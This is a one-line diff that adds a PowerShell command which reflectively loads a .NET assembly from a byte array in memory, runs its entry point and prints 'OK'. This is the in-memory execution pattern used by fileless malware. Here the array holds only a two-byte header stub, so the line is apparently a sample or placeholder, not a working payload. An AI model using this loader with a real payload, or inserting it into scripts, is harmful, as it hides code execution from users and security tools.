@@ -1,0 +1,1 @@
+[System.Reflection.Assembly]::Load(([byte[]](0x4d,0x5a))).EntryPoint.Invoke(0,@(,$null));Write-Host OK
